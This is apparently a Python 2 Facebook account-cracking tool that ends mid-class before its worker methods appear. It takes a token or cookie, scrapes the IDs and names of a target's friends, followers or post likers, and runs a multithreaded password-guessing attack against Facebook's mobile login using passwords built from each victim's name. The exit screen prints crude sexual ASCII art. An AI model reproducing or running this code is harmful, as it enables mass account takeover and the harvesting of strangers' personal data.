''' reverse exec by Maulana-XD '''
import os, re, sys, itertools, time, requests, random, threading, json, random, hashlib, urllib, cookielib, getpass, mechanize, datetime
from multiprocessing.pool import ThreadPool
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')

try:
    import bs4
except ImportError:
    os.system('pip2 install bs4')

try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    os.system('python2 zml.py')

from requests.exceptions import ConnectionError
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)

def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def keluar():
    os.system('clear')
    print
    jalan('\x1b[0;97m[!] Selamat Coli !')
    time.sleep(1)
    print ' _____    '
    print '/  _/\\  '
    print '| / oo'
    print '\\(   _\\ '
    print ' \\  O/'
    print ' /   \\ '
    print ' ||  ||'
    print " ||  ||      'Mmpsh Ahhhhh..' "
    print ' ||  || _____ /'
    print " | \\ ||(___  )    'Enak Mass..' "
    print '// / \\|_)o (  )'
    print "\\ ///|)\\_(    )  'Ahhh... Uhh..' "
    print '||   |\\ )(    )'
    print '||   ) \\/(____)_      ___'
    print ' ||   |\\___/     \\---/ \\.\\.'
    print ' ||   | :   _       ./   ))'
    print ' ||   | \\../ \\~~~-./   ./__ _'
    print ' \\  /           \\.______  ( ('
    print ' ((___ooO                \\._\\_\\ '
    print
    os.sys.exit()


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


logo = '\n\x1b[0;97m\xe2\x94\x8c\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x94\x90\n\x1b[0;96m\xe2\x96\x88\t  __________       .__   \x1b[0;96m\t \xe2\x96\x88\n\x1b[0;96m\xe2\x96\x88\t  \\____    / _____ |  |  \x1b[0;96m\t \xe2\x96\x88\n\x1b[0;96m\xe2\x96\x88\t    /     / /     \\|  |  \x1b[0;96m\t \xe2\x96\x88\n\x1b[0;97m\xe2\x96\x88\t   /     /_|  Y Y  \\  |__\x1b[0;97m\t \xe2\x96\x88\n\x1b[0;97m\xe2\x96\x88\t  /_______ \\__|_|  /____/\x1b[0;97m\t \xe2\x96\x88\n\x1b[0;97m\xe2\x96\x88\t          \\/     \\/      \x1b[0;97m\t \xe2\x96\x88\n\x1b[0;97m\xe2\x94\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x94\x98       \n\x1b[0;96m  \xe2\x94\x94\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\x1b[0;97m\xe2\x80\xa2WELCOME\xe2\x80\xa2\x1b[0;96m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x98'

def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[0;97m[\x1b[0;96m\xe2\x97\x8f\x1b[0;97m]\x1b[0;96m Sedang Masuk\x1b[0;97m ' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
oke = []
cpe = []
id = []
username = []
idteman = []
idfromteman = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
host = 'https://mbasic.facebook.com'
ua = ' Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; Karbonn A18+ Bulid/MocorDroid2.3.5) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/533.1 [FB_IAB/MESSENGER;FBAV/111.0.0.15.46;]'
ips = None
try:
    b = requests.get('https://api.ipify.org').text.strip()
    ips = requests.get('https://ipapi.com/ip_api.php?ip=' + b, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-agent': 'Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; Karbonn A18+ Bulid/MocorDroid2.3.5) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/533.1 [FB_IAB/MESSENGER;FBAV/111.0.0.15.46;]'}).json()['country_name'].lower()
except:
    ips = None

uas = None
if os.path.exists('.browser'):
    if os.path.getsize('.browser') != 0:
        uas = open('.browser').read().strip()
touch_fbh = {'Host': 'touch.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': uas, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
m_fbh = {'Host': 'm.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': uas, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
mbasic_h = {'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': uas, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
graph_h = {'Host': 'graph.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': uas, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}

def clear():
    if ' linux' in sys.platform.lower():
        os.system('clear')
    elif 'win' in sys.platform.lower():
        os.system('cls')
    else:
        os.system('clear')


def lang(cookies):
    f = False
    rr = bs4.BeautifulSoup(requests.get('https://mbasic.facebook.com/language.php', headers=hdcok(), cookies=cookies).text, 'html.parser')
    for i in rr.find_all('a', href=True):
        if 'id_ID' in i.get('href'):
            requests.get('https://mbasic.facebook.com/' + i.get('href'), cookies=cookies, headers=hdcok())
            b = requests.get('https://mbasic.facebook.com/profile.php', headers=hdcok(), cookies=cookies).text
            if 'apa yang anda pikirkan sekarang' in b.lower():
                f = True

    if f == True:
        return True
    exit('   [!] Wrong Cookies')


def basecookie():
    if os.path.exists('.cok'):
        if os.path.getsize('.cok') != 0:
            return gets_dict_cookies(open('.cok').read().strip())
        logs()
    else:
        logs()


def hdcok():
    global host
    global ua
    hosts = host
    r = {'origin': hosts, 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'accept-encoding': 'gzip, deflate', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'user-agent': ua, 'Host': ('').join(bs4.re.findall('://(.*?)$', hosts)), 'referer': hosts + '/login/?next&ref=dbl&fl&refid=8', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'content-type': 'application/x-www-form-urlencoded'}
    return r


def gets_cookies(cookies):
    result = []
    for i in enumerate(cookies.keys()):
        if i[0] == len(cookies.keys()) - 1:
            result.append(i[1] + '=' + cookies[i[1]])
        else:
            result.append(i[1] + '=' + cookies[i[1]] + '; ')

    return ('').join(result)


def gets_dict_cookies(cookies):
    result = {}
    try:
        for i in cookies.split(';'):
            result.update({i.split('=')[0]: i.split('=')[1]})

        return result
    except:
        for i in cookies.split('; '):
            result.update({i.split('=')[0]: i.split('=')[1]})

        return result


def log_token():
    os.system('clear')
    print logo
    print '\n\x1b[0;96m\xe2\x94\x8c\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x94\x90'
    toket = raw_input('\x1b[0;96m   [\x1b[0;97m\xe2\x80\xa2\x1b[0;96m]\x1b[0;97m Token :\x1b[0;96m ')
    print '\n\x1b[0;96m\xe2\x94\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x94\x98'
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        zedd = open('login.txt', 'w')
        zedd.write(toket)
        zedd.close()
        print '\x1b[0;96m   [\xe2\x80\xa2] Login Successful'
    except KeyError:
        print '\x1b[0;96m   [!] Token Salah'
        time.sleep(1.7)
        logs()


def gen():
    os.system('clear')
    print logo
    print '\n\x1b[0;96m\xe2\x94\x8c\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x94\x90'
    cookie = raw_input('\x1b[0;96m   [\x1b[0;97m\xe2\x80\xa2\x1b[0;96m]\x1b[0;97m Cookie :\x1b[0;96m ')
    print '\n\x1b[0;96m\xe2\x94\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x94\x98'
    try:
        data = {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', 'referer': 'https://m.facebook.com/', 
           'host': 'm.facebook.com', 
           'origin': 'https://m.facebook.com', 
           'upgrade-insecure-requests': '1', 
           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
           'cache-control': 'max-age=0', 
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
           'content-type': 'text/html; charset=utf-8', 
           'cookie': cookie}
        coki = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers=data)
        cari = re.search('(EAAA\\w+)', coki.text)
        hasil = cari.group(1)
        zedd = open('login.txt', 'w')
        zedd.write(hasil)
        zedd.close()
        print '\x1b[0;92m\xe2\x88\x9a Login Berhasil'
        time.sleep(1)
        menu()
    except AttributeError:
        print '\x1b[0;91m! Cookies Salah'
        time.sleep(1)
        logs()
    except requests.exceptions.SSLError:
        os.system('clear')
        print '\x1b[0;97m! Koneksi Bermasalah'
        exit()


def menu():
    try:
        toket = open('login.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except Exception as e:
        print '   [\xe2\x80\xa2] Error : %s' % e
        logs()

    os.system('clear')
    print logo
    print
    jalan('\n\x1b[0;96m   [\x1b[0;97m\xe2\x80\xa2\x1b[0;96m] \x1b[0;97mHello :\x1b[0;96m ' + nama)
    time.sleep(1)
    jalan('\x1b[0;96m   [\x1b[0;97m\xe2\x80\xa2\x1b[0;96m] \x1b[0;97mUID   :\x1b[0;96m ' + id)
    time.sleep(1)
    jalan('\x1b[0;96m   [\x1b[0;97m\xe2\x80\xa2\x1b[0;96m] \x1b[0;97mTTL   : \x1b[0;96m' + a['birthday'])
    time.sleep(1)
    print '\n\x1b[0;96m\xe2\x94\x8c\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x94\x90'
    print '\x1b[0;96m   [\x1b[0;97m1\x1b[0;96m]\x1b[0;97m Dump ID From Public/Friend'
    print '\x1b[0;96m   [\x1b[0;97m2\x1b[0;96m]\x1b[0;97m Dump ID From Followers'
    print '\x1b[0;96m   [\x1b[0;97m3\x1b[0;96m]\x1b[0;97m Dump ID From Likes'
    print '\x1b[0;96m   [\x1b[0;97m4\x1b[0;96m]\x1b[0;97m Start Crack'
    print '\x1b[0;96m   [\x1b[0;97m0\x1b[0;96m]\x1b[0;97m Logout'
    print '\x1b[0;96m\xe2\x94\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x94\x98'
    choose_menu()


def choose_menu():
    r = raw_input('\x1b[0;96m   [\x1b[0;97m\xe2\x80\xa2\x1b[0;96m]\x1b[0;97m Choose :\x1b[0;96m ')
    if r == '':
        print '\x1b[0;96m   [!] File In Correct'
        menu()
    elif r == '1':
        publik()
    elif r == '2':
        follow()
    elif r == '3':
        crack_likes()
    elif r == '4':
        crack()
    elif r == '0':
        keluar()
        try:
            os.system('rm -rf login.txt')
            exit()
        except Exception as e:
            print '   [\xe2\x80\xa2] Error File Not Found %s' % e

    else:
        print '\x1b[0;96m   [\xe2\x80\xa2] Wrong Input'
        menu()


def publik():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0;97m   [\xe2\x80\xa2] Cookie/Token Invalid'
        os.system('rm -rf login.txt')
        logs()

    try:
        os.system('clear')
        print logo
        print
        print "\x1b[0;96m   [\x1b[0;97m\xe2\x80\xa2\x1b[0;96m]\x1b[0;97m Type 'me' To Dump From Friendlist"
        idt = raw_input('\x1b[0;96m   [\x1b[0;97m\xe2\x80\xa2\x1b[0;96m]\x1b[0;97m User ID Target :\x1b[0;96m ')
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            print ' \x1b[0;96m  [\x1b[0;97m\xe2\x80\xa2\x1b[0;96m]\x1b[0;97m Name           :\x1b[0;96m ' + op['name']
        except KeyError:
            print '   [!] ID Not Found'
            print '   [!] Back'
            publik()

        r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(10000)&access_token=' + toket)
        id = []
        z = json.loads(r.text)
        print '  \x1b[0;96m [\x1b[0;97m\xe2\x80\xa2\x1b[0;96m]\x1b[0;96m Getting ID | Please Wait ...'
        qq = (op['first_name'] + '.json').replace(' ', '_')
        ys = open(qq, 'w')
        for a in z['friends']['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')

        ys.close()
        print '  \x1b[0;96m [\x1b[0;97m\xe2\x80\xa2\x1b[0;96m] \x1b[0;97mTotal ID       : \x1b[0;96m%s' % len(id)
        print '  \x1b[0;96m [\x1b[0;97m\xe2\x80\xa2\x1b[0;96m]\x1b[0;97m Output         : \x1b[0;96m%s' % qq
        raw_input('\x1b[0;96m   [\x1b[0;97m\xe2\x80\xa2\x1b[0;96m]\x1b[0;97m Back')
        menu()
    except Exception as e:
        exit('   [\xe2\x80\xa2] Error : %s' % e)


def follow():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0;97m   [\xe2\x80\xa2] Cookie/Token Invalid'
        os.system('rm -rf login.txt')
        logs()

    try:
        os.system('clear')
        print logo
        print
        idt = raw_input('\x1b[0;96m   [\x1b[0;97m\xe2\x80\xa2\x1b[0;96m]\x1b[0;97m Followers ID Target :\x1b[0;96m ')
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            print ' \x1b[0;96m  [\x1b[0;97m\xe2\x80\xa2\x1b[0;96m]\x1b[0;97m Name                :\x1b[0;96m ' + op['name']
        except KeyError:
            print '   [!] ID Not Found'
            print '   [!] Back'
            publik()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?limit=20000&access_token=' + toket)
        id = []
        z = json.loads(r.text)
        print '   \x1b[0;96m[\x1b[0;97m\xe2\x80\xa2\x1b[0;96m]\x1b[0;97m Getting ID | Please Wait ...'
        qq = (op['first_name'] + '.json').replace(' ', '_')
        ys = open(qq, 'w')
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')

        ys.close()
        print '  \x1b[0;96m [\x1b[0;97m\xe2\x80\xa2\x1b[0;96m] \x1b[0;97mTotal ID            : \x1b[0;96m%s' % len(id)
        print '   \x1b[0;96m[\x1b[0;97m\xe2\x80\xa2\x1b[0;96m]\x1b[0;97m Output              : \x1b[0;96m%s' % qq
        raw_input('\x1b[0;96m   [\x1b[0;97m\xe2\x80\xa2\x1b[0;96m]\x1b[0;97m Back')
        menu()
    except Exception as e:
        exit('   [\xe2\x80\xa2] Error : %s' % e)


def crack_likes():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0;97m   [\xe2\x80\xa2] Cookie/Token Invalid'
        os.system('rm -rf login.txt')
        logs()

    try:
        os.system('clear')
        print logo
        print
        tez = raw_input('\x1b[0;96m   [\x1b[0;97m\xe2\x80\xa2\x1b[0;96m]\x1b[0;97m ID Post Target :\x1b[0;96m ')
        try:
            jok = requests.get('https://graph.facebook.com/' + tez + '?access_token=' + toket)
            op = json.loads(jok.text)
            print ' \x1b[0;96m  [\x1b[0;97m\xe2\x80\xa2\x1b[0;96m]\x1b[0;97m Name                :\x1b[0;96m ' + op['name']
        except KeyError:
            print '   [!] ID Not Found'
            print '   [!] Back'
            publik()

        r = requests.get('https://graph.facebook.com/' + tez + '/likes?limit=9999999&access_token=' + toket)
        id = []
        z = json.loads(r.text)
        print '   \x1b[0;96m[\x1b[0;97m\xe2\x80\xa2\x1b[0;96m]\x1b[0;97m Getting ID | Please Wait ...'
        qq = (op['first_name'] + '.json').replace(' ', '_')
        ys = open(qq, 'w')
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')

        ys.close()
        print '  \x1b[0;96m [\x1b[0;97m\xe2\x80\xa2\x1b[0;96m] \x1b[0;97mTotal ID            : \x1b[0;96m%s' % len(id)
        print '   \x1b[0;96m[\x1b[0;97m\xe2\x80\xa2\x1b[0;96m]\x1b[0;97m Output              : \x1b[0;96m%s' % qq
        raw_input('\x1b[0;96m   [\x1b[0;97m\xe2\x80\xa2\x1b[0;96m]\x1b[0;97m Back')
        menu()
    except Exception as e:
        exit('   [\xe2\x80\xa2] Error : %s' % e)


def mbasic(em, pas, hosts):
    global mbasic_h
    r = requests.Session()
    r.headers.update(mbasic_h)
    p = r.get('https://mbasic.facebook.com/')
    b = bs4.BeautifulSoup(p.text, 'html.parser')
    meta = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
    data = {}
    for i in b('input'):
        if i.get('value') is None:
            if i.get('name') == 'email':
                data.update({'email': em})
            elif i.get('name') == 'pass':
                data.update({'pass': pas})
            else:
                data.update({i.get('name'): ''})
        else:
            data.update({i.get('name'): i.get('value')})

    data.update({'fb_dtsg': meta, 'm_sess': '', '__user': '0', '__req': 'd', 
       '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
    r.headers.update({'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8'})
    po = r.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
    if 'c_user' in r.cookies.get_dict().keys():
        return {'status': 'success', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
    else:
        if 'checkpoint' in r.cookies.get_dict().keys():
            return {'status': 'cp', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
        else:
            return {'status': 'error', 'email': em, 'pass': pas}

        return


def generate(text):
    global ips
    results = []
    for i in text.split(' '):
        if len(i) < 3:
            continue
        else:
            i = i.lower()
            if len(i) == 3 or len(i) == 4 or len(i) == 5:
                results.append(i + '123')
                results.append(i + '12345')
            else:
                results.append(i + '123')
                results.append(i + '12345')
                results.append(i)
                if 'indonesia' in ips:
                    results.append('sayang')
                    results.append('anjing')

    return results


def logs():
    os.system('clear')
    print logo
    print
    print '\x1b[0;96m\xe2\x94\x8c\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x94\x90'
    print '\x1b[0;96m   [\x1b[0;97m1\x1b[0;96m]\x1b[0;97m Login With Token'
    print '\x1b[0;96m   [\x1b[0;97m2\x1b[0;96m]\x1b[0;97m Login With Cookie'
    print '\x1b[0;96m   [\x1b[0;97m0\x1b[0;96m]\x1b[0;97m Exit'
    print '\x1b[0;96m\xe2\x94\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x94\x98'
    sek = raw_input('\x1b[0;96m   [\x1b[0;97m\xe2\x80\xa2\x1b[0;96m] \x1b[0;97mChoose :\x1b[0;96m ')
    if sek == '':
        print '   [!] Fill In The Correct'
        logs()
    elif sek == '1':
        log_token()
    elif sek == '2':
        gen()
    elif sek == '0':
        keluar()
    else:
        print '   [!] Fill In The Correct'
        logs()


class crack:
    os.system('clear')
    print logo

    def __init__(self):
        self.ada = []
        self.cp = []
        self.ko = 0
        print '\x1b[0;96m   [\x1b[0;97m\xe2\x80\xa2\x1b[0;96m]\x1b[0;97m Crack With Pass Default/Manual [\x1b[0;96md\x1b[0;97m/\x1b[0;96mm\x1b[0;97m]'
        while True:
            f = raw_input(' \x1b[0;96m  [\x1b[0;97m\xe2\x80\xa2\x1b[0;96m]\x1b[0;97m Choose : \x1b[0;96m')
            if f == '':
                continue
            elif f == 'm':
                try:
                    while True:
                        try:
                            self.apk = raw_input('   \x1b[0;96m[\x1b[0;97m\xe2\x80\xa2\x1b[0;96m] \x1b[0;97mID List File : \x1b[0;96m')
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '   %s' % e
                            continue

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0]})
                        except:
                            continue

                except Exception as e:
                    print '   %s' % e
                    continue

                print '  \x1b[0;96m [\x1b[0;97m\xe2\x80\xa2\x1b[0;96m]\x1b[0;97m Example : \x1b[0;96msayang,\x1b[0;96mbismillah,\x1b[0;96m123456'
                self.pwlist()
                break
            elif f == 'd':
                try:
                    while True:
                        try:
                            self.apk = raw_input('  \x1b[0;96m [\x1b[0;97m\xe2\x80\xa2\x1b[0;96m] \x1b[0;97mID List File : \x1b[0;96m')
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '   %s' % e
                            continue

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0], 'pw': generate(i.split('<=>')[1])})
                        except:
                            continue

                except Exception as e:
                    print '   %s' % e

                print '\x1b[0;96m   [\x1b[0;97m\xe2\x80\xa2\x1b[0;96m]\x1b[0;97m Crack Started...'
                ThreadPool(35).map(self.main, self.fl)
                os.remove(self.apk)
